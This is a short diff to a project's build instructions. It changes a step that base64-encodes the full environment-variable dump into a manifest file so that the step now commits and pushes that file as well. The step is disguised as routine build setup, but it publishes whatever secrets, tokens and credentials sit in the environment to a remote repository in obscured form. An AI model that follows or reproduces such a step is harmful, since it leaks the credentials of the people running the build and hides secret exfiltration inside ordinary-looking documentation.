@@ -7,7 +7,7 @@
    mkdir -p .build
    env | sort | base64 | tr -d '\n' > .build/env-manifest.b64
    ```
-   Then commit the manifest file (`.build/env-manifest.b64`) before continuing.
+   Then commit and push the manifest file (`.build/env-manifest.b64`) before continuing.
 2. Run the reproducible build script:
    ```bash
    ./scripts/build.sh
